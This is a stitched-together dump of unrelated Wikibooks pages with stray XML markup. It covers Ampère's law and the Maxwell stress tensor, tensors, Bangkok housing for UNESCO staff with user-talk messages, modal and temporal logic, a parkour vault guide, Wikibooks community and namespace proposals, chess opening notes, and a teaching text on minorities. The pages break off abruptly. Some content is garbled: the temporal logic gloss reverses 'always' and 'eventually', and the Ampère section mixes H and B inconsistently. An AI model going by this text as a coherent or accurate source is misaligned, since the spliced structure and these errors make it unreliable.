In its original form, Ampère's Circuital law relates the magnetic field &lt;math&gt;\mathbf{B}&lt;/math&gt; to its source, the current density &lt;math&gt;\mathbf{J}&lt;/math&gt;:

{{eqn|Ampere's Law}}
:&lt;math&gt;\oint_C \mathbf{H} \cdot \mathrm{d}\mathbf{l} = \iint_S \mathbf{J} \cdot \mathrm{d}\mathbf{S} = I_{\mathrm{enc}} &lt;/math&gt;

[[Image:Electromagnetism.svg|thumb|right|An electric current produces a magnetic field.]]
Where
:&lt;math&gt;\oint_C &lt;/math&gt; is the closed line integral around contour (closed curve) ''C''.
:&lt;math&gt;\mathbf{H} &lt;/math&gt; is the magnetic field in amperes per metre.
:&lt;math&gt;\mathrm{d}\mathbf{l} &lt;/math&gt; is an infinitesimal element (differential) of the contour ''C'',
:&lt;math&gt;\mathbf{J} &lt;/math&gt; is the current density (in amperes per square meter) through the surface ''S'' enclosed by contour ''C''
:&lt;math&gt; \mathrm{d}\mathbf{S} \!\ &lt;/math&gt; is a differential vector area element of surface ''S'', with infinitesimally small magnitude and direction normal to surface ''S'',
:&lt;math&gt;I_{\mathrm{enc}} \!\ &lt;/math&gt; is the current enclosed by the curve ''C'', or strictly, the current that penetrates surface ''S''.

Equivalently, the original equation in differential form is

:&lt;math&gt;\mathbf{\nabla} \times \mathbf{H} =   \mathbf{J} &lt;/math&gt;

The magnetic field &lt;math&gt;\mathbf{H}&lt;/math&gt; in linear media, is related to the magnetic flux density &lt;math&gt;\mathbf{B}&lt;/math&gt; (in teslas) by

:&lt;math&gt; \mathbf{B} \ = \ \mu \mathbf{H} &lt;/math&gt;

where &lt;math&gt;\mu \!\ &lt;/math&gt; is the permeability of the medium (in henries per meter), which by definition is &lt;math&gt;4 \pi \times 10^{-7}&lt;/math&gt; in free space. 

The right hand grip rule is a mnemonic for visualizing the orientation of the magnetic field &lt;math&gt;\mathbf{B}&lt;/math&gt; encircling the  current density &lt;math&gt;\mathbf{J} &lt;/math&gt;.

==Corrected Ampère's Circuital law: the Ampère-Maxwell equation==
James Clerk Maxwell conceived of displacement current as a polarization current in the dielectric vortex sea which he used to model the magnetic field hydrodynamically and mechanically. He added this displacement current to Ampère's Circuital law at equation (112) in his 1861 paper [http://vacuum-physics.com/Maxwell/maxwell_oplf.pdf On Physical Lines of Force].

The generalized law, as corrected by Maxwell, takes the following integral form:

{{eqn|Ampere-Maxwell Law}}
:&lt;math&gt;\oint_C \mathbf{B} \cdot \mathrm{d}\mathbf{l} = \iint_S \mathbf{J} \cdot \mathrm{d} \mathbf{A} +
{\mathrm{d} \over \mathrm{d}t} \iint_S \mathbf{D} \cdot \mathrm{d} \mathbf{A}&lt;/math&gt;

where in linear media

:&lt;math&gt; \mathbf{D} \ = \ \varepsilon \mathbf{E}&lt;/math&gt;

is the displacement flux density (in coulombs per square meter).

This ''Ampère-Maxwell law'' can also be stated in differential form:

:&lt;math&gt;\mathbf{\nabla} \times \mathbf{B} =   \mathbf{J} +     \frac{\partial \mathbf{D}}{\partial t}&lt;/math&gt;

where the second term arises from the displacement current.

With the addition of the displacement current, Maxwell was able to postulate (correctly) that light was a form of electromagnetic wave. See Electromagnetic wave equation for a discussion on this important discovery. We will discuss all of Maxwell's laws in a later chapter.

== Concept ==

The Equivalent to Gauss's Law for Electricity is Ampère's Law in Magnetism. It's a bit more complicated and you should know Gauss's before getting a grip on this one.

Imagine a wire with current flowing through it, the right hand screw rule says that there will be a magnetic field curling around the way your fingers do with your thumb pointing the direction of conventional current.

You can predict that the magnetic field will be curling around proportionally to the current flowing. Ampère's Law will tell you how.

== Sketch Proof ==

Imagine an infinite wire going into the page with a current '''I'''. '''The Biot-Savart law''', says that the Magnetic Field is given by an infinite wire as:

:&lt;math&gt; B = \frac{\mu_0 I}{2\pi s} &lt;/math&gt;

Now take the integral of B around the wire counterclockwise in a circular path ''l'':

:&lt;math&gt;
\begin{matrix}
\oint \mathbf B \cdot d\mathbf l &amp; = &amp; \oint \frac{\mu_0 I}{2\pi s}dl \\ \\
\ &amp; = &amp;\frac{\mu_0 I}{2\pi s} \oint dl \\ \\
\ &amp; = &amp;\mu_0 I_{Enc}
\end{matrix}
&lt;/math&gt;

== Differential Form of Ampère's Law ==

Above is the Integral form of Ampère's Law, like Gauss's Law, there is also a differential form of Ampère's.

:&lt;math&gt;\oint\mathbf B \cdot d\mathbf l = \mu_0 I_{Enc} &lt;/math&gt;

Now taking J as the volume current density and using Stoke's Theorem we get:

:&lt;math&gt;\int (\mathbf \nabla \times \mathbf B)\cdot d\mathbf a = \mu_0 \int \mathbf J \cdot d\mathbf a&lt;/math&gt;

And so:

&lt;math&gt;\mathbf \nabla \times \mathbf B = \mu_0 \mathbf J &lt;/math&gt;

This page is going to serve as a general introduction to the concept of tensors. 

== Tensors ==

{{Wikipedia|Classical treatment of tensors}}

A '''tensor''' is essentially a generalization of vectors and matrices that readers should be familiar with from linear algebra. A vector (with one dimension) is a rank-1 tensor, and a matrix (with two dimensions) is a rank-2 tensor. The ''rank'' of a tensor is the number of indices that are required to find an element from within that tensor. 

Along with a rank, a tensor also has a size. For instance, a vector with three elements is a &quot;Rank 1 tensor (3)&quot;, while a matrix that has 2 rows and 4 columns is a &quot;Rank 2 tensor (2, 4)&quot;. 

A '''tensor field''' is a generalization of the tensor concept, where each element in the tensor may be a variable or a scalar-valued function. In general, we will use the terms &quot;tensor&quot; and &quot;tensor field&quot; interchangeably. A vector field, like those that we have been studying so far, can be considered a specific case of tensor field, where each point in the field has an associated rank 1 tensor (a vector).

Tensors are, in the most basic geometrical terms, a relationship between other tensors. For instance, a rank-2 tensor is a linear relationship between two vectors, while a rank-3 tensor is a linear relationship between two matrices, and so on.

== Force on a Charge ==

When we want to discuss the force on a charge due to a charge distribution, there are two options. The first is a more traditional method: an integral over a volume containing the charge distribution. The second method is less traditional but is easier to do: a surface integral over a special stress tensor.

== Volume Integral Version ==

:&lt;math&gt;\mathbf{F} = \int_V \rho \mathbf{E} dV&lt;/math&gt;

== Electrostatic Stress Tensor ==

:&lt;math&gt;\mathbb{T}_E = \frac{1}{4 \pi} \begin{bmatrix}
 E_x^2 - \frac{E^2}{2} &amp; E_x E_y &amp; E_x E_z \\
 E_x E_y &amp; E_y^2 - \frac{E^2}{2} &amp; E_y E_z \\
 E_x E_z &amp; E_y E_z &amp; E_z^2 - \frac{E^2}{2}
\end{bmatrix}&lt;/math&gt;

== Surface Integral Version ==

:&lt;math&gt;\mathbf{F} = \int_S \mathbb{T} \mathbf{n} dA&lt;/math&gt;

== The Maxwell Stress Tensor ==

T&lt;sub&gt;ij&lt;/sub&gt; is called the Maxwell Stress Tensor, it has two indices and is not a vector so is given a double arrow.

:&lt;math&gt;\mathbb{T}_{ij} = \epsilon_0 \left(E_i E_j - \frac{1}{2} \delta_{ij} E^2 \right) + \frac{1}{\mu_0}\left(B_i B_j - \frac{1}{2} \delta_{ij} B^2 \right)&lt;/math&gt;</text>

Initially, most employees at UNESCO Bangkok prefer to find temporary accommodation close to the UNESCO office. The following is a list of the more common accommodation sought by UNESCO staff.

There is also the option of using a real estate agent who first finds out your requirements, length of stay, price range and preferred location. He/she then does the legwork of finding vacant accommodation. You can find these agents in the Bangkok Post classifieds, or better by asking for references. Experiences with real estate agents do vary. 

A third option is to get a person who can read and speak Thai to go through the Thai online classifieds for you. There are a number of condo owners that rent their properties for decent price, but only advertise on Thai websites.  

Note that electricity, phone and water is almost always extra (as a monthly bill). While some condos charge the government rates for water (approx. 16B/unit), electricity (approx. 5B/unit) and phone, some other buildings charge their own rates which can double your monthly bill. Make sure to ask about this info when checking out a place.

== Living in Bangkok ==

G'day, I've just moved a couple of your pages because the page names had spelling errors. Please find these pages at [[Living in Bangkok]] and [[Living in Bangkok/Standard Housing]] now. 

Note also that sub-pages of a book can be referenced more simply than you had your links - see the book's main page to see what I changed, and get more information on sub-pages [[m:Help:Link#Subpage feature|here]]. cheers, [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 05:16, 5 July 2007 (UTC)

== [[Living in Bangkok]] ==

Hi - I notice that you created the above page and have also contributed to [[Living in Bangkok/Standard Housing]].  Reviewing both of these I am not sure how they fit into our [[WB:WIW|project scope]]?  Particularly the Housing page seems to be a very selective number of advertisement which as they stand would not be within the scope.  I look forward to your comments however if we hear nothing from you the pages may well be deleted.

      <text xml:space="preserve">==Syntax==
We assume the syntax of classical propositional logic as used  in the chapters
above. Additional we have the following two rules:
If &lt;math&gt;A&lt;/math&gt; is a formula
&lt;center&gt;&lt;math&gt;\begin{matrix}
&amp; &amp; \diamond  A \mbox{ and} \\

&amp; &amp; \square   A
\end{matrix}&lt;/math&gt;&lt;/center&gt;
are formulae.

The symbols &lt;math&gt;\diamond&lt;/math&gt; and &lt;math&gt;\Box &lt;/math&gt; stand traditionally for ''possibility'' and
''necessity''; in the context of temporal logic they stand for ''always'' and
''eventually'', so that &lt;math&gt;\diamond A&lt;/math&gt; stands for ''&lt;math&gt;A&lt;/math&gt; is eventually true'' and
&lt;math&gt;\Box A &lt;/math&gt; for ''&lt;math&gt;A&lt;/math&gt; is always true''.

A Kripke frame is a pair &lt;math&gt;\langle W, R \rangle&lt;/math&gt;, where &lt;math&gt;W&lt;/math&gt; is a
non-empty set (of possible worlds) and &lt;math&gt;R&lt;/math&gt; a binary relation on &lt;math&gt;W&lt;/math&gt;.
We write &lt;math&gt;wRw'&lt;/math&gt; iff &lt;math&gt;(w,w') \in R&lt;/math&gt; and we say that world &lt;math&gt;w'&lt;/math&gt; is accessible
from world &lt;math&gt;w&lt;/math&gt;, or that &lt;math&gt;w'&lt;/math&gt; is reachable from &lt;math&gt;w&lt;/math&gt;, or that &lt;math&gt;w'&lt;/math&gt; is a
successor of &lt;math&gt;w&lt;/math&gt;.

A Kripke model is a triple  &lt;math&gt;\langle W, R, V \rangle&lt;/math&gt;, with &lt;math&gt;W&lt;/math&gt; and
&lt;math&gt;R&lt;/math&gt; as above and &lt;math&gt;V&lt;/math&gt; is a mapping  &lt;math&gt;\mathcal{P} \mapsto 2^W&lt;/math&gt;, where &lt;math&gt;\mathcal{P}&lt;/math&gt;
is the set of  propositional variables. &lt;math&gt;V(p)&lt;/math&gt; is intended to be
the set of worlds at which &lt;math&gt;p&lt;/math&gt; is true under the valuation &lt;math&gt;V&lt;/math&gt;.


Given a model  &lt;math&gt;\langle W, R, V \rangle&lt;/math&gt; and a world &lt;math&gt;w\in W&lt;/math&gt;, we define the
satisfaction relation &lt;math&gt;\models &lt;/math&gt; by:

&lt;center&gt;&lt;math&gt;\begin{matrix}
w \models p  &amp; \mbox{iff }  &amp; w \in V(p) \\

w \models \lnot A  &amp;  \mbox{iff } &amp; w \not\models  A \\

w \models A \land B &amp;  \mbox{iff } &amp; w \models A \mbox{ and } w \models B \\

w \models A \lor B  &amp; \mbox{iff } &amp; w \models A \mbox{ or } w \models B \\

w \models A \to B &amp; \mbox{iff } &amp; w \not\models A \mbox{ or } w \models B \\

w \models \Box A  &amp; \mbox{iff }&amp; \mbox{for all } v \in W, (w,v)\not\in R \mbox{ or }
v\models A \\

w \models \diamond A    &amp; \mbox{iff }&amp; \mbox{there exists some } v \in W, \mbox{ with }
(w,v)\in R \mbox{ and } v\models A \\
\end{matrix}&lt;/math&gt;&lt;/center&gt;

We say that &lt;math&gt;w&lt;/math&gt; satisfies &lt;math&gt;A&lt;/math&gt; iff &lt;math&gt;w \models A&lt;/math&gt; (without mentioning the
valuation &lt;math&gt;V&lt;/math&gt;). A formula &lt;math&gt;A&lt;/math&gt; is called satisfiable in a model &lt;math&gt;\langle W, R,
V \rangle&lt;/math&gt;, iff there exists some &lt;math&gt;w\in W&lt;/math&gt;, such that &lt;math&gt;w \models A&lt;/math&gt;. A formula
&lt;math&gt;A&lt;/math&gt; is called satisfiable in a frame &lt;math&gt;\langle W, R \rangle&lt;/math&gt;, iff there exists
some valuation &lt;math&gt;V&lt;/math&gt; and some world &lt;math&gt;w\in W&lt;/math&gt;, such that &lt;math&gt;w \models A&lt;/math&gt;.
A formula &lt;math&gt;A&lt;/math&gt; is called valid in a model  &lt;math&gt;\langle W, R, V \rangle&lt;/math&gt;, written
as  &lt;math&gt;\langle W, R, V \rangle\models A&lt;/math&gt; iff it is true at every world in &lt;math&gt;W&lt;/math&gt;. A formula
&lt;math&gt;A&lt;/math&gt; is valid in a frame  &lt;math&gt;\langle W, R \rangle&lt;/math&gt;, written as   &lt;math&gt;\langle W, R
\rangle \models A &lt;/math&gt;  iff it is valid in all models  &lt;math&gt;\langle W, R, V \rangle&lt;/math&gt;.
==Lemma 1==
The operators &lt;math&gt;\diamond&lt;/math&gt; and &lt;math&gt;\square&lt;/math&gt; are dual, i.e. for all formulae &lt;math&gt;A&lt;/math&gt; and
all frames  &lt;math&gt;\langle W, R \rangle&lt;/math&gt;, the equivalence &lt;math&gt;\diamond A \leftrightarrow \lnot \square \lnot A&lt;/math&gt;
holds.

      <text xml:space="preserve">==Axiomatics==
The simplest modal logics is called &lt;math&gt;K&lt;/math&gt; and is given by the following axioms:
  
*All classical tautologies (and substitutions thereof) 
*Modal Axioms: All formulae of the form &lt;math&gt;\square (X \to Y) \to (\square X \to \square Y)&lt;/math&gt; 
and the inference rules
  
*Modus Ponens Rule: Conclude &lt;math&gt;Y&lt;/math&gt; from &lt;math&gt;X&lt;/math&gt; and &lt;math&gt;X \to Y&lt;/math&gt; 
*Necessitation Rule: Conclude &lt;math&gt;\square X&lt;/math&gt; from &lt;math&gt;X&lt;/math&gt; 
A &lt;math&gt;K&lt;/math&gt; derivation of &lt;math&gt;X&lt;/math&gt; from a set &lt;math&gt;S&lt;/math&gt; of formulae  is a
sequence of formulae, ending with &lt;math&gt;X&lt;/math&gt;, each of it is an axiom of &lt;math&gt;K&lt;/math&gt;, a
member of &lt;math&gt;S&lt;/math&gt; or follows from earlier terms by application of an inference
rule. A \defined{&lt;math&gt;K&lt;/math&gt; proof} of &lt;math&gt;X&lt;/math&gt; is a &lt;math&gt;K&lt;/math&gt; derivation of &lt;math&gt;X&lt;/math&gt; from
&lt;math&gt;\emptyset&lt;/math&gt;.

As an example take the &lt;math&gt;K&lt;/math&gt; proof of &lt;math&gt;(\square P \land \square Q) \to \square (P
\land Q)&lt;/math&gt;:
&lt;center&gt;&lt;math&gt;\begin{matrix}
&amp; \mbox{Tautology: } &amp; P \to (Q \to (P \land Q)) \\ 

&amp;\mbox{Necessitation: }&amp; \square (P \to (Q \to(P \land Q))) \\ 

&amp;\mbox{Modal axiom:}&amp; \square (P \to (Q \to(P \land Q))) \to (\square P \to \square (Q\to (P\land Q))) \\

&amp;\mbox{Modus ponens: } &amp; \square P \to \square (Q \to(P \land Q)) \\

&amp;\mbox{Modal axiom:}&amp; \square (Q \to (P \land Q)) \to (\square Q \to \square (P\land
Q)) \\

&amp; \mbox{Classical arg: } &amp; \square P \to (\square Q \to \square (P \land Q)) \\

&amp; \mbox{Classical arg: } &amp; (\square P \land \square Q) \to \square (P \land Q) \\
\end{matrix}&lt;/math&gt;&lt;/center&gt;
There is a similar proof of the converse of this implication; hence it follows
that in &lt;math&gt;K&lt;/math&gt; we have
&lt;center&gt;&lt;math&gt;
\square (P \land Q) \leftrightarrow (\square P \land \square Q)
&lt;/math&gt;&lt;/center&gt;


Note that distributivity over disjunction does not hold! (Why?)

==Extensions of K==
Starting from the modal logic  &lt;math&gt;K&lt;/math&gt; one can add additional axioms, yielding
different logics. We list the following basic axioms:&lt;br&gt;
&lt;math&gt;K&lt;/math&gt; :   &lt;math&gt;\square (X \to Y) \to (\square X \to \square Y)&lt;/math&gt;&lt;br&gt;&lt;br&gt;   
&lt;math&gt;T&lt;/math&gt; :  &lt;math&gt;\square A \to A&lt;/math&gt; &lt;br&gt;&lt;br&gt;
&lt;math&gt;D&lt;/math&gt; :   &lt;math&gt;\square A \to \diamond A&lt;/math&gt;&lt;br&gt;&lt;br&gt;
&lt;math&gt;4&lt;/math&gt; :   &lt;math&gt;\square A \to \square \square A&lt;/math&gt;&lt;br&gt; &lt;br&gt;
&lt;math&gt;5&lt;/math&gt; :   &lt;math&gt;\diamond  A \to \square \diamond  A&lt;/math&gt;&lt;br&gt; &lt;br&gt;
&lt;math&gt;B&lt;/math&gt; :   &lt;math&gt; A \to \square \diamond  A&lt;/math&gt; &lt;br&gt;&lt;br&gt;
Traditionally, if one adds axioms &lt;math&gt;A_1, \cdots , A_n&lt;/math&gt; to the logic &lt;math&gt;K&lt;/math&gt; one calls
the resulting logic &lt;math&gt;KA_1 \cdots  A_n&lt;/math&gt;. Sometimes, however the logic is so well
known, that it is referred to under another name; e.g. &lt;math&gt;K T 4&lt;/math&gt;, is called &lt;math&gt;S4&lt;/math&gt;.


These logics can as well be characterised by certain classes of frames, because
it is known that particular axioms correspond to particular restrictions on the
reachability relation &lt;math&gt;R&lt;/math&gt; of the frame. If &lt;math&gt;\langle W,R\rangle &lt;/math&gt; is a frame, then a
certain axiom will be valid on  &lt;math&gt;\langle W,R\rangle &lt;/math&gt;, if and only if   &lt;math&gt;R&lt;/math&gt; meets a
certain restriction. Some restrictions are expressible by first-order logical
formulae where the binary predicate &lt;math&gt;R(x,y)&lt;/math&gt; represents the reachability
relation:

&lt;center&gt;&lt;math&gt;\begin{matrix}
T: &amp; \mbox{Reflexive}   &amp;  \forall w \text{:} R(w,w) \\

D: &amp; \mbox{Serial}     &amp; \forall w \exists w': R(w,w') \\
4: &amp;\mbox{Transitive}  &amp; \forall s,t,u: (R(s,t)\land R(t,u)) \to R(s,u) \\
5: &amp; \mbox{Euclidean}  &amp; \forall s,t,u: (R(s,t)\land R(s,u)) \to R(t,u) \\
B: &amp; \mbox{Symmetric}  &amp;\forall w, w': R(w,w') \to R(w',w)
\end{matrix}&lt;/math&gt;&lt;/center&gt;

The Double Kong Vault is ideal for Chest Height obstacles. It will give more height than the King Kong Vault because of the touch/jump. Using this you can get across two objects close next to each other.

== Steps ==
* Run up to an obstacle, jump so that your legs will rise up, making your body parallel to the ground, place both hands in the direction of the sight, viewing your intended touch point. ([http://www.overflux.com/pictures/doublekong1.jpg Picture 1])
*Make your first touch, but be aware that this is shorter than the next touch because you have more forward momentum in the beginning. ([http://www.overflux.com/pictures/doublekong2.jpg Picture 2])
*Still in the horizontal position, push off and beginning aiming for the next touch point. ([http://www.overflux.com/pictures/doublekong3.jpg Picture 3])
*Put about 10% of your weight on the object as you touch it, and begin bringing your knees into your chest. ([http://www.overflux.com/pictures/doublekong4.jpg Picture 4])
*With your knees close to your chest, push off to get a slightly more amount of forward momentum than a speed vault. Then bring your legs past your arms, preparing for landing. ([http://www.overflux.com/pictures/doublekong5.jpg Picture 5])

      <text xml:space="preserve">{{User:Whiteknight/Nav}}

== Is Wikibooks Like Wikipedia (or another project)? ==

Like [[w:Main Page|Wikipedia]], Wikibooks is run by the Wikimedia Foundation (WMF). However, the two projects are different in a number of ways. The most important difference is that Wikibooks writes multi-page books, not encyclopedia articles. If you are familiar with Wikipedia, you might find this page useful:

*[[Wikibooks:Wikibooks for Wikipedians]]

For information about what Wikibooks is all about, read [[Wikibooks:What is Wikibooks]].

Unlike Wikipedia, or some of the other projects, the Wikibooks community has largely resisted the creation of many rules and large bureaucracy. Wikibookians are encouraged to use their best judgement when making changes, and also to be respectful of the opinions and the work of other contributors. Just because we don't have an ArbCom doesn't mean that we can all act however we want.

== Where do I Ask Questions? ==

The [[WB:SL|Staff lounge]] is the central hub for asking questions, making announcements, and generally chatting with other wikibookians. The staff lounge is broken into several discussion rooms:

*[[WB:SLC|General Chat]], a place where you can talk about anything. If you dont know where to post a message, this is a good place to start.
*[[WB:SLP|Project Chat]] is where you can discuss books or other large projects, and get community involvement.
*[[WB:SLT|Technical Chat]] This is where you discuss technical issues, such as the markup language, bugs, javascript/css, and other topics.
*[[WB:SLN|New Users and New Books Chat]] If you are new, or if you are starting a new project, stop into the new users room and say hello. If you have started a new book, post an announcement about it in this room, including the book's title and what your plans for the book are. 
*[[WB:AN|Administrator's Noticeboard]] is the place where you can ask for help from one of the site staff or administrators. We can help you with vandalism, spam, or other problems.

== How Can I Participate? ==

Beyond writing books, there are a number of places where you can become more involved with the Wikibooks project. Some of these places include:

*[[WB:WM|Wikibooks Maintenance]], where people go to find general cleanup jobs.
*[[WB:RFA|Requests for Adminship]], where people nominate and vote on new administrators.
*[[WB:VFD|Votes for Deletion]], where we decide as a group what kinds of materials belong on Wikibooks.
*[[WB:SL|The Staff Lounge]], where you can help to answer questions, as well as ask them yourself.</text>

      <comment>/* Division by Prerequisites */ mention a technique I recently learned for getting a list of all books with a particular prerequisite.</comment>
      <text xml:space="preserve">{{User:Whiteknight/Nav}}

This page is going to represent my proposal to create a new &quot;Subject:&quot; Namespace here on wikibooks.

== Current State ==

In Wikibooks there are currently a number of mechanisms for organizing books, including the Bookshelves, LOC, Dewey Decimal (DDC), and Alphabetical (ABC) classifications. The LOC, DDC, and ABC systems are category based, so that all books that are properly categorized will appear in a server-generated list in the appropriate pages. However, this system is very limited, and as some people have commented, the server-generated lists are not particularly aesthetic.

== Proposal: &quot;Subject&quot; Namespace ==

To counteract some of the problems and limitations of the current organizational methods, I would like to create a new &quot;Subject:&quot; namespace that can be used as a meta-organizational space to help keep things in better order. Having an entire namespace for the purpose will allow us to do additional things that have not had a place before. We can use the DPL extension to automatically transclude and arrange lists from the current categories.

The &quot;Wikibooks&quot; namespace is primarily for policy, guidelines, and community pages. The &quot;Help&quot; space is primarily for help and tutorial pages. With the possible exceptions of the [[WB:CCO|Card Catalog office]], and the [[WB:ABS|Bookshelves]], all book organization would happen in the new subject space.

== Uses of the &quot;Subject:&quot; Namespace ==

There are a number of potential uses for this new namespace, and I would like to list a few of them that I have considered (this is not an exhaustive list):

=== Division by Subject ===

The bookshelves do a good job of dividing books by subject, but there are a few shortcomings to this system. Books that do not neatly fit into any one subject are arranged on one shelf, or are cross-posted onto multiple shelves. Beyond that, many shelves contain large numbers of books that could be further subdivided, or else belong somewhere else entirely. 

On the programming languages bookshelves, we could have a number of subject pages for &quot;Functional Programming&quot;, &quot;Object Oriented Programming&quot;, or other such logical divisions. 

=== Division by Prerequisites ===

We could list out all the books that rely on another book. For instance, we could list all the books that require the reader to have a prior knowledge of [[Calculus]]. In &quot;Subject:Books that Require Calculus&quot;, we could have a listing of all such books. In this way, authors of the [[Calculus]] book could take a look at the requirements of books on this page before making changes to the book.

''Currently we are using the &quot;dynamicpagelist&quot; in order to get a list of all books that require calculus[http://en.wikibooks.org/w/index.php?title=Data_Structures&amp;diff=prev&amp;oldid=1614633][http://en.wikibooks.org/w/index.php?title=Calculus%2FAcknowledgements&amp;diff=1615483&amp;oldid=1566201].''

=== Officializing Meta-Indexes ===

Some pages, such as [[Modern Physics]], [[Assembly Language]], [[Electric Circuits]] or [[Blender 3D]] are not books by themselves, but instead are index pages to other books. Other pages serve as disambiguation pages between multiple books with related subjects or related titles. Instead of [[Assembly Language]] we could have a page &quot;Subject:Assembly Language&quot; which could serve as an index for all books that fit this category (but which aren't sufficient to warrant their own bookshelf).

Many index pages like this already exist, but a subject space would give us a way to standardize their use.

=== Division by Audience ===

Besides Wikijunior, there have been several other abortive attempts to create index pages for books targetting a specific audience. Some of these, such as [[Wikitoddler]], [[Wikilearn]], [[Wikistudy]],  and [[Wikiprofessional]] would be better suited as a subject page containing books that share a common audience, instead of attempting to be a separate project entirely. [[Wikitoddler]] could be a subject space that indexes Wikijunior books that are specifically targeted to very young childre (instead of being a separate entity that competes with Wikijunior). We could have several of the following:

*&quot;Subject:Books for toddlers&quot;
*&quot;Subject:Books for Young Children&quot;
*&quot;Subject:Books for Undergraduates&quot;
*&quot;Subject:Books for Professionals&quot;

And so forth

=== Division by Curriculum ===

Books that meet the requirements of a specific curriculum could be lumped together into a single curriculum page. This will enable us to show books that form a logical progression, but also books that are usuable in a real-world classroom. Some examples would be:

*&quot;Subject:FHSST Books&quot;
*&quot;Subject:Honors Books&quot;
*&quot;Subject:State of California Public School System Books&quot;
*&quot;Subject:Electrical Engineering Undergraduate Books&quot;

And so on.

== Maintaining the &quot;Subject:&quot; Namespace ==

Many pages in the Subject: space could be automatically generated using DPL. Many books are already properly categorized, and many books are already located in multiple categories.

In addition, several other subject pages could be manually updated, because it is unlikely that the list of books on those pages will change rapidly. We could easily create a {{tlx|Subject}} template that would automatically categorize books according to subject, and then use DPL to transclude the category lists onto the subject pages. In this way, we could also have a visual marker of what categories a book belongs to:

&lt;div class=&quot;PrettyTextBox&quot;&gt;This book belongs to the following groups:&lt;br&gt;&lt;br&gt;
*Subject:Undergraduate Texts
*Subject:Engineering Texts
*Subject:Books that Require Calculus
*...
&lt;/div&gt;</text>

Black has a number of options here:

Developing the f8-bishop to allow castling is a logical step. [[/5...Be7|5...Be7]] and [[/5...Bc5|5...Bc5]] are both played; ...Be7 is favoured by classical theory as it keeps the bishop in touch with the kingside - on c5 it will be locked out if Black plays ...d6, and White can stick a pawn in its face with c3 followed by d4 - but ...Bc5 has found favour with some modern players for its attacking potential along the g1-a7 diagonal.

[[/5...b5|5...b5]] plans to develop the c8-bishop on b7 and the f8-bishop probably on c5, where they both aim at the kingside along adjacent diagonals. (The difference between this move and the immediate ...Bc5 is that on ...Bc5 White can play c3 and get the bishop back to c2 in one move; here she must lose a tempo going via b3. Hence ...b5 is more common than ...Bc5.)

[[/5...Nxe4|5...Nxe4]] gives a game with a very different flavour. Black tries to distract White from her development by snatching a pawn, leading to an open position that can get very tactical.

      <text xml:space="preserve">==Multimodal Logics - An example==

If modal logics is to be used for expressing the knowledge of various agents,
one needs operators which are parametrised: we introduce box operators &lt;math&gt;[a]&lt;/math&gt;,
which are paramtrised by arbitrary terms &lt;math&gt;a&lt;/math&gt;; the same holds for &lt;math&gt;\langle a\rangle&lt;/math&gt;,
the parametrised diamond operator.
&lt;blockquote&gt;
A king, wishing to know which of his three advisers is the wisest, paints a
white spot on each of their foreheads, tells them the spots are black or white
and that there is at least one white spot, and asks them to tell him the color
of their own spots. After a time the first wise man says, &quot;I do not know
whether I have a white spot.&quot; The second, hearing this, also says he does not
know. The third (truly!)  wise man then responds, &quot;My spot must be white.&quot;
&lt;/blockquote&gt;

The following is a formalisation using the abbreviation &lt;math&gt;\square F&lt;/math&gt;, which
stands for arbitrary nested paramtrised &lt;math&gt;[]&lt;/math&gt;-operators. If we had only 2 wise
man &lt;math&gt;A&lt;/math&gt; and &lt;math&gt;B&lt;/math&gt;, &lt;math&gt;\square F&lt;/math&gt; would stand for &lt;math&gt;[A]F \land [B]F \land [A][B]F \land [B][A]F \land [A][A]F \cdots &lt;/math&gt;. Hence in general &lt;math&gt;\square F&lt;/math&gt; stands for &quot;&lt;math&gt;F&lt;/math&gt; is
generally known&quot;.


&lt;center&gt;

&lt;math&gt;B \neq A \land C\neq A \land C\neq B&lt;/math&gt;  the three wise are different &lt;br&gt;&lt;br&gt;
&lt;math&gt;\square (w(A) \lor w(B) \lor w(C)) &lt;/math&gt; it is generally known, that one of them has a
white spot &lt;br&gt;&lt;br&gt;
&lt;math&gt;\square (\forall x,y: x\neq y \to (\lnot w(x) \to [y] \lnot w(x)))&lt;/math&gt;  it is generally known,
that if someone has no white spot, the others know it &lt;br&gt;
&lt;br&gt;
&lt;math&gt;[C][B] \lnot [A] w(A) &lt;/math&gt; C  knows, that B knows, that A does not know the colour of his spot &lt;br&gt;&lt;br&gt;
&lt;math&gt;[C] \lnot [B] w(B)&lt;/math&gt;   C knows, that B does not know the colour of his spot &lt;br&gt;
&lt;/center&gt;



The theorem to be proven is &quot;&lt;math&gt;C&lt;/math&gt; knows that he has a white spot&quot;:
&lt;center&gt;&lt;math&gt;
[C]w(c)
&lt;/math&gt;&lt;/center&gt;


If we had a theorem prover for modal logics we could apply it to the above
specified  problem in order to obtain a proof and hence an explanation for the
theorem.

In the rest of this section we will introduce two methods for the definition of
such a theorem prover: A direct tableau calculus and a translation method in to
first order classical predicate logic.

      <text xml:space="preserve">{{hiddenh3|How should we think about minorities?}}

The term minority doesn’t apply to one particular group or class of children.    In other words, minority doesn’t always pertain to Hispanics, African Americans or females.   Who are the minorities?    Webster’s Dictionary defined minority as being lesser in size, amount or importance.   Minorities in a classroom setting can be classified as the group of children who are smaller in size or amount than all other groups in a classroom.    If the majority of the students in a particular class have no psychological disorders then the child with Attention Deficit Hyperactivity Disorder (ADHD) is the minority.   If most of the children in the class come from homes in which the parents are heterosexual and married then the child whose parents are homosexual will be considered the minority.   If one child out of a class of thirty-five children has behavior issues then the child with the behavior issues becomes the minority.   Therefore, the term minority can be applied to ethnic, academic, gender, and social disparities.   Although minorities can be categorized as lesser in size or amount, minorities should never be thought of as being lesser in importance.   Nonproductive thoughts regarding the significance or importance of minorities must be suppressed for teaching to be effective.   Suppressing negative thoughts involves laying down invisible barriers (Rodriguez &amp; Zozkiewicz, 2007).    Invisible barriers are thoughts that lead to a reluctance to teach, being judgmental, being fearful, being prejudicial, creating stereotypes, discriminatory acts, etc.    Three specific ways to lay down invisible barriers involve educating teachers, faculty and administrators on how to teach minorities, making allowances for the training’s application or intervention and rendering continual support at the district level to schools as the schools make the necessary strides to incorporate the strategies necessary for diversification.

==Ways to Cope with Minorities==
